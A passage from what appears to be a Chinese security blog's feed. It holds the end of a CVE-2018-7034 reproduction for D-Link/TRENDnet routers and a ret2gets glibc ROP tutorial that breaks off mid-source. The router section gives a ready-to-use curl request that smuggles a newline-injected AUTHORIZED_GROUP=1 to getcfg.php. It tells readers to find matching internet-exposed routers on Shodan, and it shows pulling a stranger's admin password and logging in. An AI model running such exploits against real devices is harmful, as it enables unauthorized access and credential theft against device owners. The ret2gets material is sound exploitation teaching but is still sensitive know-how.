<code>squashfs-root</code> 文件夹中原本的 <code>cgibin</code><br>我们继续开始调试最后一步查看我们的 <code>AUTHORIZED_GROUP</code> 最后是什么</p><p>我们运行到 <code>sprintf(v15, &quot;AUTHORIZED_GROUP=%d&quot;, -1);</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/24.png"><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/25.png"></p><p>执行之后</p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/26.png"><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/27.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;_POST_SERVICES=DEVICE.ACCOUNT\n_POST_attack=ture\nAUTHORIZED_GROUP=1\n\nAUTHORIZED_GROUP=-1&quot;</span></span><br></pre></td></tr></table></figure><p>也就是说程序原本打算写入的是 <code>AUTHORIZED_GROUP=-1</code>，但是由于前面我们已经插入了一个<code>AUTHORIZED_GROUP=1</code> 以此被我们截胡了，让 <code>AUTHORIZED_GROUP</code> 变成了 <code>1</code> 由此绕过了检测</p><h3 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a><strong>漏洞利用演示</strong></h3><p>前面叽里呱啦讲一堆都不重要，其实不论有没有看懂都不影响我们使用<br>我们只需要使用下面这条指令就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://[ip:port]/getcfg.php&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>shodon</code> 找个同型号的路由器试一试<br><a href="https://www.shodan.io/search?query=tew-751dr">tew-751dr - Shodan Search</a></p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/28.png"></p><p>在浏览器访问 <code>ip:port</code><br>访问成功会出现下面界面<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/29.png"></p><p>我们直接使用上面给出的指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://[ip:port]/getcfg.php&quot;</span></span><br></pre></td></tr></table></figure><p>由此我们可以获得密码<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/30.png"></p><p>然后就可以成功登入了<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/31.png"></p><p>到此为止算是复现完成了</p><p>参考:<br><a href="https://xz.aliyun.com/news/6057">Dlink getcfg.php远程敏感信息读取漏洞分析-先知社区</a><br><a href="https://blog.csdn.net/GKD2019/article/details/146465026">D-Link 登录信息泄露（越权）CVE-2018-7034 漏洞分析_trendnet路由器getcfg.php-信息泄露漏洞(cve-2018-7034)-CSDN博客</a><br><a href="https://www.iotsec-zone.com/article/384#d-link-%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> CVE </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2gets的原理与利用方法</title>
      <link href="/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="前言​​"><a href="#前言​​" class="headerlink" title="前言​​"></a><strong>前言​</strong>​</h3><p>ret2gets是一种利用glibc优化特性（高版本编译器）的漏洞利用技术，核心是通过<code>gets</code>函数配合<code>printf</code>&#x2F;<code>puts</code>实现libc地址泄露。该技术适用于:</p><ol><li>存在栈溢出漏洞</li><li>程序包含<code>gets</code>函数</li><li>​<strong>​缺乏直接控制rdi寄存器的gadget​</strong>​（如<code>pop rdi; ret</code>）</li></ol><blockquote><p>技术原型参考: ret2gets | pwn-notes  <a href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#sidenote-on-finding-locking-functions">ret2gets | pwn-notes</a><br>演示程序: ret2gets_demo <a href="https://pan.baidu.com/s/1rf8JEi1sGBZdM-MxpnjMTg?pwd=xidp">https://pan.baidu.com/s/1rf8JEi1sGBZdM-MxpnjMTg?pwd=xidp</a> 提取码: xidp</p></blockquote><h3 id="程序中-pop-rdi-ret-的来源"><a href="#程序中-pop-rdi-ret-的来源" class="headerlink" title="程序中 pop rdi; ret 的来源"></a><strong>程序中 pop rdi; ret 的来源</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc demo.c -o demo -no-pie -fno-stack-protector</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;ROP me if you can!&quot;</span>);</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们正常会采用的方法很简单就是 <code>ret2libc</code><br>我们会利用gets的溢出，使用程序的里面的gadget来构造 <code>puts(func_got_addr)</code> 来泄露某一函数在的libc地址从而获取libc基地址，再控制程序返回，再来一次溢出使用gadget构造 <code>system(&#39;/bin/sh&#39;)</code> 以此来获得远程的shell</p><p>但是对于这个程序编译之后我们会遇到一个问题，下面我们使用ROPgadget来查看一下我们可用的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary demo</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x00000000004010ab</span> : add bh, bh ; loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401037</span> : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x000000000040115f</span> : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line"><span class="number">0x0000000000401078</span> : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x0000000000401160</span> : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line"><span class="number">0x000000000040111a</span> : add byte ptr [rax], al ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401039</span> : add byte ptr [rax], al ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401161</span> : add byte ptr [rax], al ; leave ; ret</span><br><span class="line"><span class="number">0x000000000040107a</span> : add byte ptr [rax], al ; nop dword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x0000000000401034</span> : add byte ptr [rax], al ; push <span class="number">0</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401044</span> : add byte ptr [rax], al ; push <span class="number">1</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401009</span> : add byte ptr [rax], al ; test rax, rax ; je <span class="number">0x401012</span> ; call rax</span><br><span class="line"><span class="number">0x000000000040111b</span> : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401162</span> : add cl, cl ; ret</span><br><span class="line"><span class="number">0x00000000004010aa</span> : add dil, dil ; loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401047</span> : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x000000000040111c</span> : add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401117</span> : add eax, <span class="number">0x2f03</span> ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401118</span> : add ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401013</span> : add esp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401012</span> : add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x00000000004010a8</span> : and byte ptr [rax + <span class="number">0x40</span>], al ; add bh, bh ; loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401010</span> : call rax</span><br><span class="line"><span class="number">0x0000000000401133</span> : cli ; jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x0000000000401130</span> : endbr64 ; jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x000000000040100e</span> : je <span class="number">0x401012</span> ; call rax</span><br><span class="line"><span class="number">0x00000000004010a5</span> : je <span class="number">0x4010b0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004010e7</span> : je <span class="number">0x4010f0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x000000000040103b</span> : jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401134</span> : jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x00000000004010ac</span> : jmp rax</span><br><span class="line"><span class="number">0x0000000000401163</span> : leave ; ret</span><br><span class="line"><span class="number">0x00000000004010ad</span> : loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401116</span> : mov byte ptr [rip + <span class="number">0x2f03</span>], <span class="number">1</span> ; pop rbp ; ret</span><br><span class="line"><span class="number">0x000000000040115e</span> : mov eax, <span class="number">0</span> ; leave ; ret</span><br><span class="line"><span class="number">0x00000000004010a7</span> : mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004010af</span> : nop ; ret</span><br><span class="line"><span class="number">0x000000000040112c</span> : nop dword ptr [rax] ; endbr64 ; jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x000000000040107c</span> : nop dword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x00000000004010a6</span> : or dword ptr [rdi + <span class="number">0x404020</span>], edi ; jmp rax</span><br><span class="line"><span class="number">0x000000000040111d</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401036</span> : push <span class="number">0</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401046</span> : push <span class="number">1</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401016</span> : ret</span><br><span class="line"><span class="number">0x0000000000401042</span> : ret <span class="number">0x2f</span></span><br><span class="line"><span class="number">0x0000000000401022</span> : retf <span class="number">0x2f</span></span><br><span class="line"><span class="number">0x000000000040100d</span> : sal byte ptr [rdx + rax - <span class="number">1</span>], <span class="number">0xd0</span> ; add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401169</span> : sub esp, <span class="number">8</span> ; add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401168</span> : sub rsp, <span class="number">8</span> ; add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x000000000040100c</span> : test eax, eax ; je <span class="number">0x401012</span> ; call rax</span><br><span class="line"><span class="number">0x00000000004010a3</span> : test eax, eax ; je <span class="number">0x4010b0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004010e5</span> : test eax, eax ; je <span class="number">0x4010f0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x000000000040100b</span> : test rax, rax ; je <span class="number">0x401012</span> ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">53</span></span><br></pre></td></tr></table></figure><p>在以往我们想要构造函数调用，不论是 <code>puts(func_got_addr)</code> 还是  <code>system(&#39;/bin/sh&#39;)</code> 我们首先需要的一点就是控制 <code>rdi寄存器</code><br>而我们往往是使用 <code>pop rdi;ret</code> 这个gadget来控制rdi寄存器的，但是显然，上面的程序是没有的<br>如果我们再仔细观察我们会发现其实下面这三个我们常用的gadget都没有了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br><span class="line">pop rsi; pop r15; ret</span><br><span class="line">pop rbp; pop r12; pop r13; pop r14; ret</span><br></pre></td></tr></table></figure><p>这是由于程序中的 <code>pop rdi ;ret</code> 它大概的位置在 <code>&lt;__libc_csu_init+99&gt;: pop rdi</code><br>也就是说它存在于 <code>__libc_csu_init</code> 这个函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_init 的汇编</span><br><span class="line">   <span class="number">0x0000000000400670</span> &lt;+<span class="number">0</span>&gt;:push   r15</span><br><span class="line">   <span class="number">0x0000000000400672</span> &lt;+<span class="number">2</span>&gt;:push   r14</span><br><span class="line">   <span class="number">0x0000000000400674</span> &lt;+<span class="number">4</span>&gt;:mov    r15d,edi</span><br><span class="line">   <span class="number">0x0000000000400677</span> &lt;+<span class="number">7</span>&gt;:push   r13</span><br><span class="line">   <span class="number">0x0000000000400679</span> &lt;+<span class="number">9</span>&gt;:push   r12</span><br><span class="line">   <span class="number">0x000000000040067b</span> &lt;+<span class="number">11</span>&gt;:lea    r12,[rip+<span class="number">0x20078e</span>]        # <span class="number">0x600e10</span></span><br><span class="line">   <span class="number">0x0000000000400682</span> &lt;+<span class="number">18</span>&gt;:push   rbp</span><br><span class="line">   <span class="number">0x0000000000400683</span> &lt;+<span class="number">19</span>&gt;:lea    rbp,[rip+<span class="number">0x20078e</span>]        # <span class="number">0x600e18</span></span><br><span class="line">   <span class="number">0x000000000040068a</span> &lt;+<span class="number">26</span>&gt;:push   rbx</span><br><span class="line">   <span class="number">0x000000000040068b</span> &lt;+<span class="number">27</span>&gt;:mov    r14,rsi</span><br><span class="line">   <span class="number">0x000000000040068e</span> &lt;+<span class="number">30</span>&gt;:mov    r13,rdx</span><br><span class="line">   <span class="number">0x0000000000400691</span> &lt;+<span class="number">33</span>&gt;:sub    rbp,r12</span><br><span class="line">   <span class="number">0x0000000000400694</span> &lt;+<span class="number">36</span>&gt;:sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000400698</span> &lt;+<span class="number">40</span>&gt;:sar    rbp,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x000000000040069c</span> &lt;+<span class="number">44</span>&gt;:call   <span class="number">0x4004b0</span> &lt;_init&gt;</span><br><span class="line">   <span class="number">0x00000000004006a1</span> &lt;+<span class="number">49</span>&gt;:test   rbp,rbp</span><br><span class="line">   <span class="number">0x00000000004006a4</span> &lt;+<span class="number">52</span>&gt;:je     <span class="number">0x4006c6</span> &lt;__libc_csu_init+<span class="number">86</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004006a6</span> &lt;+<span class="number">54</span>&gt;:xor    ebx,ebx</span><br><span class="line">   <span class="number">0x00000000004006a8</span> &lt;+<span class="number">56</span>&gt;:nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x00000000004006b0</span> &lt;+<span class="number">64</span>&gt;:mov    rdx,r13</span><br><span class="line">   <span class="number">0x00000000004006b3</span> &lt;+<span class="number">67</span>&gt;:mov    rsi,r14</span><br><span class="line">   <span class="number">0x00000000004006b6</span> &lt;+<span class="number">70</span>&gt;:mov    edi,r15d</span><br><span class="line">   <span class="number">0x00000000004006b9</span> &lt;+<span class="number">73</span>&gt;:call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">   <span class="number">0x00000000004006bd</span> &lt;+<span class="number">77</span>&gt;:add    rbx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004006c1</span> &lt;+<span class="number">81</span>&gt;:cmp    rbx,rbp</span><br><span class="line">   <span class="number">0x00000000004006c4</span> &lt;+<span class="number">84</span>&gt;:jne    <span class="number">0x4006b0</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004006c6</span> &lt;+<span class="number">86</span>&gt;:add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004006ca</span> &lt;+<span class="number">90</span>&gt;:pop    rbx</span><br><span class="line">   <span class="number">0x00000000004006cb</span> &lt;+<span class="number">91</span>&gt;:pop    rbp</span><br><span class="line">   <span class="number">0x00000000004006cc</span> &lt;+<span class="number">92</span>&gt;:pop    r12</span><br><span class="line">   <span class="number">0x00000000004006ce</span> &lt;+<span class="number">94</span>&gt;:pop    r13</span><br><span class="line">   <span class="number">0x00000000004006d0</span> &lt;+<span class="number">96</span>&gt;:pop    r14</span><br><span class="line">   <span class="number">0x00000000004006d2</span> &lt;+<span class="number">98</span>&gt;:pop    r15</span><br><span class="line">   <span class="number">0x00000000004006d4</span> &lt;+<span class="number">100</span>&gt;:ret</span><br></pre></td></tr></table></figure><p>我们观察它的汇编代码其实不难发现，它其中并未含有 <code>pop rdi ; ret</code> 这个gadget<br>其实它来自于 <code>pop r15;</code> 的一部分</p><p>对比下面字节码我们就可以知道，<code>pop rdi; ret</code> 的字节码和 <code>pop r15; ret</code> 后半部分相同，所以把 <code>pop r15; ret</code> 截下来一半就是 <code>pop rdi;ret</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop r15 ; ret = <span class="number">41</span> <span class="number">5f</span> c3</span><br><span class="line">pop rdi ; ret = <span class="number">5f</span> c3</span><br></pre></td></tr></table></figure><p>而在glibc 2.34 中 <code>pop rdi; ret</code> 消失的根本原因是<a href="https://sourceware.org/pipermail/libc-alpha/2021-February/122794.html">一个补丁</a>移除了 <code>__libc_csu_init</code> 的二进制生成。<br>该补丁旨在删除 <code>ret2csu</code> 的有用 ROP 小工具，并具有删除针对 glibc 2.34+ 编译的二进制文件中的 <code>pop rdi ; ret</code> 的效果。</p><p>这将导致一些问题，例如 <code>__libc_start_main</code>，它将 <code>__libc_csu_init</code> 作为参数。现在它不存在，它仍然接受参数，但对它没有任何作用，所以它在 2.34 中被版本优化了，因为它现在有不同的行为。这意味着我们不能够在较旧的 glibc 版本上运行为 2.34+ 编译的二进制文件，否则你会得到非常烦人的错误, 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>: version `GLIBC_2<span class="number">.34&#x27;</span> not found</span><br></pre></td></tr></table></figure><p>现在我们知道在程序中由于 <code>__libc_csu_init</code> 函数被优化了，所以我们已经没办法在编译后的程序中找到 <code>pop rdi;ret</code> 了<br>但是没有关系，<code>__libc_csu_init</code> 并非是 <code>pop rdi;ret</code> 的唯一来源，显然按照我们上面的解释，哪里有 <code>pop r15</code> 那么哪里就会有 <code>pop rdi</code></p><p>虽然程序中没有 <code>pop rdi</code><br>但是glibc自身含大量使用r15的函数，必存<code>pop r15; ret</code>，泄露libc基址后，即可定位libc中的<code>pop rdi; ret</code>偏移</p><p>所以我们最大的问题还是需要溢出</p><h3 id="ret2gets原理和利用方法"><a href="#ret2gets原理和利用方法" class="headerlink" title="ret2gets原理和利用方法"></a><strong>ret2gets原理和利用方法</strong></h3><p>让我们来调试一下我们的demo(glibc-2.35)<br>通过下图我们可以看到，在调用 <code>gets函数</code> 之前我们的 <code>rdi寄存器</code> 是指向了栈地址<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/1.png"></p><p>我们使用 <code>n</code> 步过 <code>call gets</code> 然后我们就会观察发现 <code>rdi寄存器</code> 变成了 <code>_IO_stdfile_0_lock</code><br>也就是下图的 <code>*RDI  0x7ffff7e1ba80 (_IO_stdfile_0_lock) ◂— 0</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/2.png"></p><p>而 <code>_IO_stdfile_0_lock</code> 其实是一个’锁’，用来锁住 <code>FILE</code><br>这是因为我们的glibc是支持多线程的，因此我们需要保证线程安全，这意味着我们需要抵抗数据竞争，当多个线程可以同时使用相同的FILE结构，因此如果2个线程尝试同时使用一个FILE，这就叫竞争条件，这可能造成FILE的损坏。而我们使用锁来解决这个问题</p><p>而我们重点需要关注一个叫做 <code>_IO_lock_t</code> 的结构体<br>具体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> cnt;</span><br><span class="line">    <span class="type">void</span> *owner;</span><br><span class="line">&#125; _IO_lock_t;</span><br></pre></td></tr></table></figure><p>实际上我们被优化后的 <code>gets函数</code> 执行之后 <code>rdi寄存器</code> 所指向的 <code>_IO_stdfile_0_lock</code> 其实就是 <code>FILE结构体</code> 的 <code>_IO_lock_t *_lock; </code><br>而这个结构体的里面的这个 <code>owner</code> 在一定条件下它存储的是 <code>TLS的地址</code>， 而 <code>TLS的地址</code> 和 <code>libc基地址</code> 的偏移是固定的，所以如果我们可以控制程序流，那么我们可以采用下面思路:</p><ol><li>执行一次 <code>gets</code>，这时 <code>rdi寄存器</code> 指向这个 <code>_lock</code></li><li>我们再执行一次 <code>gets</code>，这样就可以往 <code>_lock</code> 里面写东西用来填充，如果程序中有 <code>printf</code> 我们甚至可以写入 <code>%p</code> 等格式化字符串来泄露地址</li><li>如果我们是调用 <code>puts</code> 那么在上面第二次 <code>gets</code> 的时候就可以填充一些 <code>特定的东西</code> 绕过一些检测，从而是的 <code>puts</code> 可以输出存放在 <code>owner</code> 中的 <code>TLS地址</code></li></ol><p>由此我们已经知道大致的利用思路和漏洞的大概，下面就是通过源码分析来了解我们需要绕过什么保护从而达到我们想要的效果</p><h3 id="gets源码分析"><a href="#gets源码分析" class="headerlink" title="gets源码分析"></a><strong>gets源码分析</strong></h3><h4 id="IO-stdfile-0-lock从哪来的"><a href="#IO-stdfile-0-lock从哪来的" class="headerlink" title="_IO_stdfile_0_lock从哪来的"></a><strong>_IO_stdfile_0_lock从哪来的</strong></h4><p>下面以gets的源码为例展开分析，源码地址<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31">gets</a>（链接glibc为 2.35）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line">_IO_gets (<span class="type">char</span> *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line">  <span class="type">char</span> *retval;</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdin</span>);     <span class="comment">// 对标准输入流stdin加锁，防止多线程环境下多个线程同时操作输入流导致数据竞争</span></span><br><span class="line">  ch = _IO_getc_unlocked (<span class="built_in">stdin</span>);  <span class="comment">// 通过_IO_getc_unlocked无锁方式读取第一个字符</span></span><br><span class="line">  <span class="comment">// 若首字符是EOF（文件结束符或输入错误），直接返回NULL</span></span><br><span class="line">  <span class="comment">// 若首字符是换行符\n，则count=0，表示空字符串</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      retval = <span 